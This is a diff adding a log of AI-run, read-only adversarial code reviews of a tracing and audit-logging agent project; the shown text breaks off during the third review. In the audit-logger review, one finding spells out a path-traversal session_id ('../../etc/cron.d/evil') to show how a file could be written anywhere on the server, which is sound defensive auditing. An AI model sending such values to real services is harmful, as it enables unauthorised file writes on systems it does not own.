@@ -1,0 +1,884 @@
+================================================================================
+CODE REVIEW LOOP LOG (BMAD WORKFLOW)
+Epic: 2
+Started: 2026-03-24 11:39:28
+Mode: READ-ONLY with BMAD Agent
+================================================================================
+
+2026-03-24 11:39:28 [INFO] ============================================================
+2026-03-24 11:39:28 [INFO] CODE REVIEW LOOP (BMAD WORKFLOW) - Epic 2
+2026-03-24 11:39:29 [INFO] Mode: READ-ONLY (no fixes will be applied)
+2026-03-24 11:39:29 [INFO] Results file: /c/alcorn/Gauntlet/6-Shipyard/shipyard/looper/epic2-code-review-bmad-results.log
+2026-03-24 11:39:29 [INFO] Log file: /c/alcorn/Gauntlet/6-Shipyard/shipyard/looper/epic2-code-review-bmad.log
+2026-03-24 11:39:29 [INFO] ============================================================
+2026-03-24 11:39:30 [INFO] Found 4 stories in Epic 2
+2026-03-24 11:39:30 [INFO] Stories to review:
+2026-03-24 11:39:30 [INFO]   - 2-1-langsmith-tracing-custom-metadata: review
+2026-03-24 11:39:30 [INFO]   - 2-2-markdown-audit-logger: review
+2026-03-24 11:39:30 [INFO]   - 2-3-shareable-trace-links: review
+2026-03-24 11:39:30 [INFO]   - 2-4-codeagent-mvp-sections: review
+
+============================================================
+STORIES IN EPIC 2
+============================================================
+2-1-langsmith-tracing-custom-metadata: review
+2-2-markdown-audit-logger: review
+2-3-shareable-trace-links: review
+2-4-codeagent-mvp-sections: review
+============================================================
+
+2026-03-24 11:39:31 [INFO] ============================================================
+2026-03-24 11:39:31 [INFO] STARTING CODE REVIEWS NOW...
+2026-03-24 11:39:31 [INFO] ============================================================
+2026-03-24 11:39:31 [INFO] [1/4] Processing: 2-1-langsmith-tracing-custom-metadata (status: review)
+2026-03-24 11:39:31 [REVIEW] ==========================================
+2026-03-24 11:39:32 [REVIEW] Reviewing: 2-1-langsmith-tracing-custom-metadata (status: review)
+2026-03-24 11:39:32 [REVIEW] ==========================================
+2026-03-24 11:39:37 [INFO] Running read-only code review (tools: Read,Glob,Grep,Task,TodoWrite,Skill)...
+
+================================================================================
+PROMPT: Code Review | Story: 2-1-langsmith-tracing-custom-metadata | Time: 2026-03-24 11:39:37
+================================================================================
+You are performing a BMAD-style adversarial code review for story 2-1-langsmith-tracing-custom-metadata.
+
+SETUP: Read these files first for project context and coding standards:
+  - /c/alcorn/Gauntlet/6-Shipyard/shipyard/_bmad-output/project-context.md
+  - /c/alcorn/Gauntlet/6-Shipyard/shipyard/CLAUDE.md
+  - /c/alcorn/Gauntlet/6-Shipyard/shipyard/coding-standards.md
+
+Then read the story spec file:
+  - /c/alcorn/Gauntlet/6-Shipyard/shipyard/_bmad-output/implementation-artifacts/2-1-langsmith-tracing-custom-metadata.md
+
+Then find and read ALL source files and test files referenced in or created by the story.
+
+CRITICAL: This is a READ-ONLY audit. Do NOT fix any issues. ONLY report them.
+
+YOU MUST EXECUTE ALL THREE REVIEW LAYERS BELOW:
+
+=== LAYER 1: BLIND HUNTER ===
+Review the code with NO regard for the spec — purely from what you see in the code itself.
+Find: bugs, security issues, logic errors, code quality problems, anti-patterns.
+For each finding: one-line title, severity (critical/high/medium/low), evidence from the code.
+
+=== LAYER 2: EDGE CASE HUNTER ===
+Walk every branching path and boundary condition. Report ONLY unhandled edge cases.
+Focus on: boundary conditions, missing validation, race conditions, platform-specific issues,
+encoding problems, empty inputs, path traversal, concurrency, error propagation.
+For each finding: one-line title, severity, the specific edge case, evidence.
+
+=== LAYER 3: ACCEPTANCE AUDITOR ===
+Review the implementation against the story spec and acceptance criteria.
+Check for: violations of acceptance criteria, deviations from spec intent,
+missing implementation of specified behavior, contradictions between spec constraints and code.
+Also check against coding-standards.md and CLAUDE.md rules.
+For each finding: one-line title, which AC/rule it violates, evidence.
+
+=== OUTPUT FORMAT ===
+Present findings grouped by layer. For each finding include:
+- One-line title
+- Severity: CRITICAL / HIGH / MEDIUM / LOW
+- Evidence: file path, line number, code snippet
+- Category: BUG / SECURITY / LOGIC / QUALITY / EDGE_CASE / SPEC_VIOLATION / CONVENTION
+
+End with a summary:
+Issues Found: [total count]
+By Layer: Blind Hunter: [N], Edge Case Hunter: [N], Acceptance Auditor: [N]
+By Severity: Critical: [N], High: [N], Medium: [N], Low: [N]
+
+================================================================================
+
+
+================================================================================
+OUTPUT: Code Review | Story: 2-1-langsmith-tracing-custom-metadata
+================================================================================
+Now I have all the files. Let me compile the full three-layer adversarial review.
+
+---
+
+# BMAD Adversarial Code Review: Story 2.1 — LangSmith Tracing & Custom Metadata
+
+## Files Reviewed
+- `src/multi_agent/roles.py` (new) — `build_trace_config()` with validation
+- `src/agent/graph.py` (modified) — `create_trace_config()` convenience wrapper
+- `src/main.py` (modified) — HTTP and CLI invoke paths with trace config
+- `tests/test_multi_agent/test_roles.py` (new) — 11 unit tests
+- `tests/test_agent/test_graph.py` (modified) — 5 integration tests
+- `src/agent/nodes.py`, `src/agent/state.py` — supporting context
+
+---
+
+## LAYER 1: BLIND HUNTER
+
+### 1. `model_tier` metadata is disconnected from actual model used
+- **Severity:** MEDIUM
+- **Category:** LOGIC
+- **Evidence:** `src/agent/nodes.py:43` hardcodes `DEFAULT_MODEL = "claude-sonnet-4-6"` regardless of what `model_tier` is recorded in trace metadata. `src/multi_agent/roles.py:183-188` writes `model_tier` to metadata but nothing enforces the actual model matches. Passing `model_tier="opus"` to `build_trace_config` produces a trace that claims Opus was used, but the agent always uses Sonnet.
+  ```python
+  # nodes.py:43 — always sonnet
+  model = ChatAnthropic(model=DEFAULT_MODEL).bind_tools(tools)
+  # roles.py:186 — writes whatever you tell it
+  "model_tier": model_tier,
+  ```
+
+### 2. SQLite connection opened but never closed
+- **Severity:** MEDIUM
+- **Category:** QUALITY
+- **Evidence:** `src/agent/graph.py:55-57` — `sqlite3.connect()` returns a connection that is passed to `SqliteSaver` but never stored for cleanup. There is no close mechanism on the compiled graph. On repeated `create_agent()` calls (e.g., in tests), connections accumulate.
+  ```python
+  conn = sqlite3.connect(checkpoints_db, check_same_thread=False)
+  memory = SqliteSaver(conn)
+  return graph.compile(checkpointer=memory)  # conn leaked
+  ```
+
+### 3. Module-level graph creation at import time
+- **Severity:** MEDIUM
+- **Category:** QUALITY
+- **Evidence:** `src/main.py:35` — `graph = create_agent()` executes at module import, opening a real SQLite connection and creating the checkpoints DB file. Any code that imports `src.main` (including test discovery or FastAPI's auto-loading) triggers this side effect.
+  ```python
+  graph = create_agent()  # line 35 — runs at import time
+  ```
+
+### 4. Empty-string `parent_session` included in metadata (truthy check missing)
+- **Severity:** LOW
+- **Category:** LOGIC
+- **Evidence:** `src/multi_agent/roles.py:189-190` — the guard is `if parent_session is not None`, so `parent_session=""` would be included in metadata as an empty string, which is likely not intended.
+  ```python
+  if parent_session is not None:
+      metadata["parent_session"] = parent_session  # "" passes this check
+  ```
+
+### 5. No validation on `session_id` or `task_id` parameters
+- **Severity:** LOW
+- **Category:** QUALITY
+- **Evidence:** `src/multi_agent/roles.py:149-156` — `agent_role`, `model_tier`, and `phase` are validated against allowed sets, but `session_id` and `task_id` accept any string including empty `""`. Empty `session_id` would produce `thread_id: ""` which could cause unpredictable checkpointing behavior.
+
+---
+
+## LAYER 2: EDGE CASE HUNTER
+
+### 6. Empty `session_id` creates empty `thread_id` for checkpointing
+- **Severity:** MEDIUM
+- **Category:** EDGE_CASE
+- **Evidence:** `src/multi_agent/roles.py:193` — `"thread_id": session_id` with no guard. An empty string thread_id could collide with other empty-session invocations or cause `SqliteSaver` lookup issues.
+  ```python
+  "configurable": {"thread_id": session_id},  # "" is valid here
+  ```
+- **Specific edge case:** `build_trace_config(session_id="", agent_role="dev", task_id="t", model_tier="sonnet", phase="implementation")` succeeds but produces a config that could break downstream checkpointing.
+
+### 7. `_extract_response` silently drops non-dict content blocks
+- **Severity:** LOW
+- **Category:** EDGE_CASE
+- **Evidence:** `src/main.py:113-115` — when `content` is a `list`, only `dict` blocks with a `"text"` key are processed. Anthropic API responses can include `thinking` blocks or other content types that are not dicts or lack `"text"`. These would be silently discarded, returning an empty string.
+  ```python
+  return " ".join(
+      block.get("text", "") for block in content if isinstance(block, dict)
+  )
+  ```
+- **Specific edge case:** An `AIMessage` with `content=[{"type": "thinking", "thinking": "..."}]` returns `""` because there's no `"text"` key.
+
+### 8. Relative path for checkpoints directory depends on working directory
+- **Severity:** LOW
+- **Category:** EDGE_CASE
+- **Evidence:** `src/main.py:32` uses `os.makedirs("checkpoints", exist_ok=True)` and `src/agent/graph.py:19` defines `CHECKPOINTS_DB = "checkpoints/shipyard.db"` — both are relative paths. If the process starts from a different working directory (e.g., `python -m src.main` from a parent directory), the checkpoints directory is created in the wrong location.
+- **Specific edge case:** Running from Docker or a systemd service where CWD differs from project root.
+
+### 9. CLI loop reuses a single trace config for all messages
+- **Severity:** LOW
+- **Category:** EDGE_CASE
+- **Evidence:** `src/main.py:128` creates the config once before the `while True` loop at line 136. All messages in a CLI session share the same `thread_id` and metadata. This is intentional for session persistence, but if the user changes tasks mid-session, the `task_id` metadata becomes stale.
+  ```python
+  config = create_trace_config(session_id=session_id, task_id=session_id)  # set once
+  while True:
+      ...
+      result = graph.invoke({...}, config=config)  # same config every loop
+  ```
+
+---
+
+## LAYER 3: ACCEPTANCE AUDITOR
+
+### 10. `task_id` always equals `session_id` — not a meaningful task identifier
+- **Severity:** MEDIUM
+- **Category:** SPEC_VIOLATION
+- **AC violated:** AC#2 — "it includes metadata: ... `task_id`"
+- **Evidence:** `src/main.py:81` (HTTP) and `src/main.py:128` (CLI) both set `task_id=session_id`, making `task_id` a UUID rather than a meaningful identifier like `"story-42"` (the example in the spec and architecture Pattern 6). The trace metadata `task_id` field becomes redundant with `thread_id`.
+  ```python
+  # main.py:81
+  config = create_trace_config(session_id=session_id, task_id=session_id)
+  # main.py:128
+  config = create_trace_config(session_id=session_id, task_id=session_id)
+  ```
+- **Mitigation note:** The story's dev notes say "For MVP (single agent)..." so using session_id may be acceptable for now, but it reduces the value of the `task_id` metadata field for filtering in LangSmith.
+
+### 11. Parameter ordering inconsistency between `build_trace_config` and `create_trace_config`
+- **Severity:** LOW
+- **Category:** CONVENTION
+- **Evidence:** `src/multi_agent/roles.py:149-156` has `(session_id, agent_role, task_id, ...)` while `src/agent/graph.py:60-67` has `(session_id, task_id, agent_role, ...)`. The `task_id` and `agent_role` parameters swap positions. While both use keyword arguments internally, positional callers would get different behavior from the wrapper vs. the underlying function.
+  ```python
+  # roles.py — agent_role before task_id
+  def build_trace_config(session_id, agent_role, task_id, model_tier, phase, ...)
+  # graph.py — task_id before agent_role
+  def create_trace_config(session_id, task_id, agent_role="dev", ...)
+  ```
+
+### 12. `AgentState.current_phase` values don't fully align with trace `phase` values
+- **Severity:** LOW
+- **Category:** SPEC_VIOLATION
+- **AC violated:** Coding standards / project-context consistency
+- **Evidence:** `src/agent/state.py:24` documents `current_phase` as `"test", "dev", "review", "architect", "fix", "ci"` but the valid trace phases in `src/multi_agent/roles.py:17` are `"test", "implementation", "review", "fix", "ci"`. The state uses `"dev"` and `"architect"` which are not valid trace phases; the trace uses `"implementation"` which is not a state phase. This conceptual mismatch could cause confusion when correlating state with trace metadata.
+  ```python
+  # state.py:24
+  current_phase: str  # "test", "dev", "review", "architect", "fix", "ci"
+  # roles.py:17
+  VALID_PHASES = frozenset({"test", "implementation", "review", "fix", "ci"})
+  ```
+
+### 13. Tests don't verify that `InstructRequest` (HTTP endpoint) actually propagates metadata to traces
+- **Severity:** LOW
+- **Category:** SPEC_VIOLATION
+- **AC violated:** AC#4 — "tool call input/output appears as a child span under the agent node"
+- **Evidence:** Neither `test_roles.py` nor `test_graph.py` test the integration path in `src/main.py` where `create_trace_config` is passed to `graph.invoke()`. The HTTP endpoint and CLI loop are the actual wiring points, but they have zero test coverage for trace config propagation. Unit tests verify the config dict shape but not that LangGraph actually receives and uses it.
+
+---
+
+## Summary
+
+| | |
+|---|---|
+| **Issues Found** | **13** |
+| **By Layer** | Blind Hunter: **5**, Edge Case Hunter: **4**, Acceptance Auditor: **4** |
+| **By Severity** | Critical: **0**, High: **0**, Medium: **4**, Low: **9** |
+
+### Medium Issues (action recommended)
+1. `model_tier` metadata doesn't drive actual model selection — misleading traces
+2. SQLite connection never closed — resource leak on repeated creation
+3. Module-level graph creation causes import side effects
+4. `task_id` always equals `session_id` — metadata field loses diagnostic value
+
+### Assessment
+The implementation is solid and functionally correct for the MVP scope. All acceptance criteria are met at a functional level. The medium-severity findings are real concerns but none are blockers — they represent maintainability debt and minor data-quality issues in traces. The code quality is high: clean type hints, proper validation, good test coverage of the core function, and consistent naming conventions. No critical or high-severity issues found.
+================================================================================
+
+2026-03-24 11:44:08 [SUCCESS] Code review complete for 2-1-langsmith-tracing-custom-metadata - Issues found: unknown - Duration: 4m 31s
+2026-03-24 11:44:09 [INFO] [2/4] Processing: 2-2-markdown-audit-logger (status: review)
+2026-03-24 11:44:09 [REVIEW] ==========================================
+2026-03-24 11:44:09 [REVIEW] Reviewing: 2-2-markdown-audit-logger (status: review)
+2026-03-24 11:44:09 [REVIEW] ==========================================
+2026-03-24 11:44:15 [INFO] Running read-only code review (tools: Read,Glob,Grep,Task,TodoWrite,Skill)...
+
+================================================================================
+PROMPT: Code Review | Story: 2-2-markdown-audit-logger | Time: 2026-03-24 11:44:15
+================================================================================
+You are performing a BMAD-style adversarial code review for story 2-2-markdown-audit-logger.
+
+SETUP: Read these files first for project context and coding standards:
+  - /c/alcorn/Gauntlet/6-Shipyard/shipyard/_bmad-output/project-context.md
+  - /c/alcorn/Gauntlet/6-Shipyard/shipyard/CLAUDE.md
+  - /c/alcorn/Gauntlet/6-Shipyard/shipyard/coding-standards.md
+
+Then read the story spec file:
+  - /c/alcorn/Gauntlet/6-Shipyard/shipyard/_bmad-output/implementation-artifacts/2-2-markdown-audit-logger.md
+
+Then find and read ALL source files and test files referenced in or created by the story.
+
+CRITICAL: This is a READ-ONLY audit. Do NOT fix any issues. ONLY report them.
+
+YOU MUST EXECUTE ALL THREE REVIEW LAYERS BELOW:
+
+=== LAYER 1: BLIND HUNTER ===
+Review the code with NO regard for the spec — purely from what you see in the code itself.
+Find: bugs, security issues, logic errors, code quality problems, anti-patterns.
+For each finding: one-line title, severity (critical/high/medium/low), evidence from the code.
+
+=== LAYER 2: EDGE CASE HUNTER ===
+Walk every branching path and boundary condition. Report ONLY unhandled edge cases.
+Focus on: boundary conditions, missing validation, race conditions, platform-specific issues,
+encoding problems, empty inputs, path traversal, concurrency, error propagation.
+For each finding: one-line title, severity, the specific edge case, evidence.
+
+=== LAYER 3: ACCEPTANCE AUDITOR ===
+Review the implementation against the story spec and acceptance criteria.
+Check for: violations of acceptance criteria, deviations from spec intent,
+missing implementation of specified behavior, contradictions between spec constraints and code.
+Also check against coding-standards.md and CLAUDE.md rules.
+For each finding: one-line title, which AC/rule it violates, evidence.
+
+=== OUTPUT FORMAT ===
+Present findings grouped by layer. For each finding include:
+- One-line title
+- Severity: CRITICAL / HIGH / MEDIUM / LOW
+- Evidence: file path, line number, code snippet
+- Category: BUG / SECURITY / LOGIC / QUALITY / EDGE_CASE / SPEC_VIOLATION / CONVENTION
+
+End with a summary:
+Issues Found: [total count]
+By Layer: Blind Hunter: [N], Edge Case Hunter: [N], Acceptance Auditor: [N]
+By Severity: Critical: [N], High: [N], Medium: [N], Low: [N]
+
+================================================================================
+
+
+================================================================================
+OUTPUT: Code Review | Story: 2-2-markdown-audit-logger
+================================================================================
+Now I have all the code needed. Let me compile the full adversarial review.
+
+---
+
+# BMAD Adversarial Code Review — Story 2.2: Markdown Audit Logger
+
+---
+
+## LAYER 1: BLIND HUNTER
+
+### 1. `audit.end_session()` not called if `graph.invoke()` raises
+- **Severity:** HIGH
+- **Category:** BUG
+- **Evidence:** `src/main.py:86-94` — In the `/instruct` endpoint, `audit.start_session()` registers the logger in the global `_active_loggers` dict, then `graph.invoke()` runs with no try/finally. If `graph.invoke()` raises, `audit.end_session()` is never called:
+  ```python
+  audit.start_session()
+  result = graph.invoke(...)  # could raise
+  audit.end_session()         # skipped on exception
+  ```
+  Same issue in `_run_cli()` at line 150 — if `graph.invoke()` throws, `audit.end_session()` at line 162 is never reached.
+
+### 2. Memory leak in `_active_loggers` global registry
+- **Severity:** HIGH
+- **Category:** BUG
+- **Evidence:** `src/logging/audit.py:13` — `_active_loggers: dict[str, AuditLogger] = {}` is module-level mutable state. If `end_session()` is never called (see finding #1), the logger and all its accumulated state remain in the dict permanently, leaking memory on every failed request.
+
+### 3. `_active_loggers` is not thread-safe
+- **Severity:** MEDIUM
+- **Category:** BUG
+- **Evidence:** `src/logging/audit.py:13,57,110` — FastAPI's sync endpoint `instruct` runs in a thread pool. Multiple concurrent requests perform unsynchronized reads and writes to `_active_loggers` (`__setitem__` in `start_session()`, `.pop()` in `end_session()`, `.get()` in `get_logger()`). While CPython's GIL makes dict operations atomic at the bytecode level, this is an implementation detail, not a language guarantee, and the logic as a whole (check-then-act patterns in nodes.py) is not atomic.
+
+### 4. `_write()` overwrites file, `_append()` opens raw handle — inconsistent I/O
+- **Severity:** LOW
+- **Category:** QUALITY
+- **Evidence:** `src/logging/audit.py:112-119` — `_write()` uses `Path.write_text()` (overwrite semantics) while `_append()` uses `open()` with mode `"a"`. If `start_session()` is accidentally called twice, the first session's log entries are silently destroyed.
+
+### 5. No guard against calling log methods before `start_session()`
+- **Severity:** LOW
+- **Category:** BUG
+- **Evidence:** `src/logging/audit.py:116-119` — `_append()` does `open(self._log_path, "a")`. If called before `start_session()` creates the `logs/` directory, this raises `FileNotFoundError`. There's no validation that the session has been started.
+
+---
+
+## LAYER 2: EDGE CASE HUNTER
+
+### 6. Path traversal via `session_id`
+- **Severity:** HIGH
+- **Category:** SECURITY
+- **Evidence:** `src/logging/audit.py:42` — `self._log_path = self._logs_dir / f"session-{session_id}.md"`. If `session_id` contains `../`, files can be written outside the `logs/` directory. The `/instruct` endpoint at `src/main.py:80` accepts `session_id` from the request body with no sanitization:
+  ```python
+  session_id = request.session_id or str(uuid.uuid4())
+  ```
+  A malicious POST with `session_id: "../../etc/cron.d/evil"` would write to an arbitrary path.
+
+### 7. Windows-invalid characters in `session_id` crash file creation
+- **Severity:** MEDIUM
+- **Category:** EDGE_CASE
+- **Evidence:** `src/logging/audit.py:42` — On Windows (this project's platform), characters like `:`, `*`, `?`, `"`, `<`, `>`, `|` in `session_id` cause `OSError` from `_write()`. The `/instruct` endpoint passes user-supplied session_id directly through with no validation.
+
+### 8. `log_tool_call` with empty string `file_path` treated as no-file
+- **Severity:** LOW
+- **Category:** EDGE_CASE
+- **Evidence:** `src/logging/audit.py:80-84` — `if file_path:` is falsy for empty string `""`, so an empty-string file_path is treated identically to `None`. This means `""` is never added to `_files_touched`, slightly undercounting files. In practice, tools are unlikely to pass `""`, but the condition doesn't distinguish between "no file" and "empty path".
+
+### 9. No disk-full / I/O error handling in `_append()`
+- **Severity:** LOW
+- **Category:** EDGE_CASE
+- **Evidence:** `src/logging/audit.py:117-119` — `_append()` has no try/except. An `OSError` (disk full, permission denied) propagates up through the audit logging call, potentially crashing the tool_node mid-execution at `src/agent/nodes.py:94`. The audit logger is supposed to be a non-intrusive supplement, but a disk error would kill the agent session.
+
+### 10. Concurrent file appends for same session could interleave
+- **Severity:** LOW
+- **Category:** EDGE_CASE
+- **Evidence:** `src/logging/audit.py:117-119` — Each `_append()` opens, writes, and closes the file. If the LangGraph runtime ever executes tool calls concurrently for the same session (e.g., parallel tool execution), log lines could interleave or corrupt. Currently the graph is sequential, so this is latent rather than active.
+
+---
+
+## LAYER 3: ACCEPTANCE AUDITOR
+
+### 11. `log_agent_done()` is never called in integration — tree format incomplete
+- **Severity:** HIGH
+- **Category:** SPEC_VIOLATION
+- **Evidence:** `src/agent/nodes.py` — Neither `agent_node` nor `tool_node` nor `src/main.py` ever calls `audit.log_agent_done()`. The `│  └─ Done` line specified in Task 2 and shown in Decision 6's format is never emitted in production. The tree format in a real session will be:
+  ```
+  ├─ [dev - claude-sonnet-4-6] Started
+  │  ├─ Read: file (SUCCESS)
+  │  ├─ Edit: file (SUCCESS)
+  │
+  └─ [Session Complete] ...
+  ```
+  **Violates:** AC #4 (must match tree-style format from Decision 6), Task 2 (`log_agent_done()` integration), Task 6 (integrate logger into agent loop).
+
+### 12. `log_bash()` is never called in integration — scripts never counted
+- **Severity:** HIGH
+- **Category:** SPEC_VIOLATION
+- **Evidence:** `src/agent/nodes.py:72-96` — `tool_node()` calls `audit.log_tool_call()` for every tool, including `run_command`/bash tools. It never calls `audit.log_bash()`. In production, `_script_count` is always 0 and bash tool calls appear as regular tool entries, not in the Decision 6 bash format:
+  ```
+  ├─ [Bash] {script_name}
+  │  └─ {result}
+  ```
+  **Violates:** AC #3 (summary includes `{scripts} scripts` — always 0), AC #4 (bash format doesn't match Decision 6), Task 6.
+
+### 13. Summary line missing `${cost}` — deviates from Decision 6
+- **Severity:** MEDIUM
+- **Category:** SPEC_VIOLATION
+- **Evidence:** Architecture doc Decision 6 specifies: `└─ [Session Complete] Total: {agents} agents, {scripts} scripts, ${cost}, {files} files touched`. Implementation at `src/logging/audit.py:107-108` omits `${cost}`:
+  ```python
+  f"└─ [Session Complete] Total: {self._agent_count} agents, "
+  f"{self._script_count} scripts, {files_count} files touched"
+  ```
+  The story spec (Task 3) also omits cost, suggesting this was a deliberate scoping decision, but AC #4 says the format must match Decision 6.
+  **Violates:** AC #4.
+
+### 14. Tool call format deviates from Decision 6
+- **Severity:** MEDIUM
+- **Category:** SPEC_VIOLATION
+- **Evidence:** Decision 6 shows different formats per tool type:
+  ```
+  │  ├─ Read: {file}
+  │  ├─ Edit: {file} ({description})
+  ```
+  But the implementation at `src/logging/audit.py:82` applies a uniform format with `({result_prefix})` for all tools:
+  ```
+  │  ├─ Read: src/main.py (SUCCESS)
+  ```
+  Decision 6's Read has no parenthetical, and Edit uses a description, not SUCCESS/ERROR. The story spec redefines this as `({result_prefix})`, so the implementation matches the story, but AC #4 references Decision 6 directly.
+  **Violates:** AC #4 (strictly interpreted).
+
+### 15. No test for `get_logger()` function or `_active_loggers` lifecycle
+- **Severity:** MEDIUM
+- **Category:** SPEC_VIOLATION
+- **Evidence:** `tests/test_logging/test_audit.py` — No test verifies that `start_session()` registers the logger in `_active_loggers` or that `end_session()` removes it. The `get_logger()` function (the primary integration point used by `nodes.py`) has zero test coverage.
+  **Violates:** Task 5 (write unit tests), coding standards (test both success and error paths).
+
+### 16. No integration test for audit logging in graph execution
+- **Severity:** MEDIUM
+- **Category:** SPEC_VIOLATION
+- **Evidence:** Task 6 requires integration into the agent loop. There are no tests verifying that `agent_node` calls `log_agent_start()` or that `tool_node` calls `log_tool_call()` during graph execution. The unit tests only test `AuditLogger` in isolation.
+  **Violates:** Task 6 (integrate audit logger into the agent loop).
+
+### 17. `test_log_is_valid_markdown` is a weak validation
+- **Severity:** LOW
+- **Category:** QUALITY
+- **Evidence:** `tests/test_logging/test_audit.py:252-254` — The "valid markdown" check is just `assert "<" not in content`. This doesn't validate markdown structure in any meaningful way. A file containing only random binary data with no `<` character would pass. Task 5 says "Test that log file is valid markdown."
+  **Violates:** Task 5 (test that log file is valid markdown).
+
+---
+
+## Summary
+
+| Metric | Count |
+|---|---|
+| **Issues Found** | **17** |
+| **By Layer** | Blind Hunter: **5**, Edge Case Hunter: **5**, Acceptance Auditor: **7** |
+| **By Severity** | Critical: **0**, High: **4**, Medium: **6**, Low: **7** |
+
+### High-Severity Issues Requiring Attention
+
+| # | Title | Category |
+|---|---|---|
+| 1 | `audit.end_session()` not called if `graph.invoke()` raises | BUG |
+| 2 | Memory leak in `_active_loggers` global registry | BUG |
+| 6 | Path traversal via `session_id` | SECURITY |
+| 11 | `log_agent_done()` never called in integration | SPEC_VIOLATION |
+| 12 | `log_bash()` never called in integration | SPEC_VIOLATION |
+
+The core `AuditLogger` class is well-implemented and its unit tests are solid. The primary gaps are in the **integration layer** (findings 11, 12) where two of the five logging methods are never actually invoked during real execution, and in **error resilience** (findings 1, 2) where the lack of try/finally around `graph.invoke()` means the audit log is never finalized on failures. The path traversal issue (finding 6) is the most actionable security concern since the `/instruct` endpoint accepts user-supplied `session_id` without sanitization.
+================================================================================
+
+2026-03-24 11:47:07 [SUCCESS] Code review complete for 2-2-markdown-audit-logger - Issues found: unknown - Duration: 2m 52s
+2026-03-24 11:47:08 [INFO] [3/4] Processing: 2-3-shareable-trace-links (status: review)
+2026-03-24 11:47:08 [REVIEW] ==========================================
+2026-03-24 11:47:08 [REVIEW] Reviewing: 2-3-shareable-trace-links (status: review)
+2026-03-24 11:47:08 [REVIEW] ==========================================
+2026-03-24 11:47:14 [INFO] Running read-only code review (tools: Read,Glob,Grep,Task,TodoWrite,Skill)...
+
+================================================================================
+PROMPT: Code Review | Story: 2-3-shareable-trace-links | Time: 2026-03-24 11:47:14
+================================================================================
+You are performing a BMAD-style adversarial code review for story 2-3-shareable-trace-links.
+
+SETUP: Read these files first for project context and coding standards:
+  - /c/alcorn/Gauntlet/6-Shipyard/shipyard/_bmad-output/project-context.md
+  - /c/alcorn/Gauntlet/6-Shipyard/shipyard/CLAUDE.md
+  - /c/alcorn/Gauntlet/6-Shipyard/shipyard/coding-standards.md
+
+Then read the story spec file:
+  - /c/alcorn/Gauntlet/6-Shipyard/shipyard/_bmad-output/implementation-artifacts/2-3-shareable-trace-links.md
+
+Then find and read ALL source files and test files referenced in or created by the story.
+
+CRITICAL: This is a READ-ONLY audit. Do NOT fix any issues. ONLY report them.
+
+YOU MUST EXECUTE ALL THREE REVIEW LAYERS BELOW:
+
+=== LAYER 1: BLIND HUNTER ===
+Review the code with NO regard for the spec — purely from what you see in the code itself.
+Find: bugs, security issues, logic errors, code quality problems, anti-patterns.
+For each finding: one-line title, severity (critical/high/medium/low), evidence from the code.
+
+=== LAYER 2: EDGE CASE HUNTER ===
+Walk every branching path and boundary condition. Report ONLY unhandled edge cases.
+Focus on: boundary conditions, missing validation, race conditions, platform-specific issues,
+encoding problems, empty inputs, path traversal, concurrency, error propagation.
+For each finding: one-line title, severity, the specific edge case, evidence.
+
+=== LAYER 3: ACCEPTANCE AUDITOR ===
+Review the implementation against the story spec and acceptance criteria.
+Check for: violations of acceptance criteria, deviations from spec intent,
+missing implementation of specified behavior, contradictions between spec constraints and code.
+Also check against coding-standards.md and CLAUDE.md rules.
+For each finding: one-line title, which AC/rule it violates, evidence.
+
+=== OUTPUT FORMAT ===
+Present findings grouped by layer. For each finding include:
+- One-line title
+- Severity: CRITICAL / HIGH / MEDIUM / LOW
+- Evidence: file path, line number, code snippet
+- Category: BUG / SECURITY / LOGIC / QUALITY / EDGE_CASE / SPEC_VIOLATION / CONVENTION
+
+End with a summary:
+Issues Found: [total count]
+By Layer: Blind Hunter: [N], Edge Case Hunter: [N], Acceptance Auditor: [N]
+By Severity: Critical: [N], High: [N], Medium: [N], Low: [N]
+
+================================================================================
+
+
+================================================================================
+OUTPUT: Code Review | Story: 2-3-shareable-trace-links
+================================================================================
+Now I have all the information needed. Let me compile the full adversarial code review.
+
+---
+
+# Adversarial Code Review: Story 2-3 — Shareable Trace Links
+
+**Story Type:** Documentation / validation task (not a coding task)
+**Artifact Produced:** `docs/trace-links.md` (new file)
+**Downstream Consumer:** `CODEAGENT.md` Trace Links section
+
+---
+
+## LAYER 1: BLIND HUNTER
+*Code reviewed with no regard for the spec — purely from what exists in the files.*
+
+### Finding 1.1: `docs/trace-links.md` contains only bare URLs with zero context
+
+- **Severity:** MEDIUM
+- **Category:** QUALITY
+- **Evidence:** `docs/trace-links.md:1-2`
+  ```
+  https://smith.langchain.com/public/9d212cc9-7537-4656-8581-f8c4bc190a98/r
+  https://smith.langchain.com/public/114ea778-4414-4e01-aa2a-c97d915e5cc6/r
+  ```
+  No title, no markdown headers, no labels, no descriptions. A reader opening this file has no way to determine which URL is the happy-path trace vs. the error-recovery trace without cross-referencing CODEAGENT.md. This file is functionally useless as a standalone document.
+
+### Finding 1.2: File has no markdown structure despite being a `.md` file
+
+- **Severity:** LOW
+- **Category:** QUALITY
+- **Evidence:** `docs/trace-links.md:1-2` — The entire file is two raw URLs. No `#` heading, no bullet points, no explanatory text. It doesn't leverage markdown formatting at all despite having a `.md` extension.
+
+---
+
+## LAYER 2: EDGE CASE HUNTER
+*Walk every branching path and boundary condition. Report ONLY unhandled edge cases.*
+
+### Finding 2.1: No local backup or description of trace content if URLs become inaccessible
+
+- **Severity:** LOW
+- **Category:** EDGE_CASE
+- **Evidence:** `docs/trace-links.md:1-2` — Both trace URLs point to `smith.langchain.com/public/...` which is an external SaaS service. If LangSmith changes their URL scheme, the sharing is revoked, or the project/org changes, these links silently break. There is no local description of what each trace contained (node count, tool calls made, execution path taken) that would survive link rot. CODEAGENT.md has 1-sentence descriptions but not the actual trace data.
+
+### Finding 2.2: URLs are not distinguishable without external context
+
+- **Severity:** LOW
+- **Category:** EDGE_CASE
+- **Evidence:** `docs/trace-links.md:1-2` — Both URLs are opaque UUIDs. If someone needs to update one specific link (e.g., regenerate only the error-recovery trace), they must open both URLs in a browser to figure out which is which, or check CODEAGENT.md. No inline label distinguishes them.
+
+---
+
+## LAYER 3: ACCEPTANCE AUDITOR
+*Review implementation against story spec and acceptance criteria.*
+
+### Finding 3.1: Task 5 subtask "Include a 1-sentence description" not met in `docs/trace-links.md`
+
+- **Severity:** MEDIUM
+- **Category:** SPEC_VIOLATION
+- **Evidence:**
+  - **Spec (Task 5):** `_bmad-output/implementation-artifacts/2-3-shareable-trace-links.md:37`
+    > - [x] Include a 1-sentence description of what each trace demonstrates
+  - **Actual (`docs/trace-links.md`):** No descriptions present — only bare URLs.
